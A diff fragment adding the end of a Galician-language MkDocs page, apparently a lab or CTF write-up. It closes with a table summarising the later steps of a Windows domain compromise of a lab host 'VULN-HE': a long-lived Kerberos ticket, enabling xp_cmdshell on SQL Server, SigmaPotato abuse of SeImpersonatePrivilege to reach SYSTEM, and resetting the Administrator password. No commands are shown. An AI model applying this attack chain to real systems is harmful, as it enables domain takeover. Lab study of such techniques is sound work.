+<tr>
+<td>5</td>
+<td>Verificación do ticket</td>
+<td>Ticket válido 2025-2035</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Acceso a SQL Server con Kerberos</td>
+<td>Conexión como <code>VULN-HE\Administrador</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Activación de <code>xp_cmdshell</code></td>
+<td>Execución remota como <code>svc_sql</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>Comprobación de privilexios</td>
+<td><code>SeImpersonatePrivilege</code> habilitado</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Descarga de SigmaPotato</td>
+<td>Ferramenta en <code>C:\Temp\sp.exe</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td>Explotación de <code>SeImpersonatePrivilege</code></td>
+<td>Escalada a <code>NT AUTHORITY\SYSTEM</code></td>
+</tr>
+<tr>
+<td>11</td>
+<td>Cambio de contrasinal do Administrador</td>
+<td>Control total do dominio</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../../../js/opera.js"></script>
+      
+        <script src="../../../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
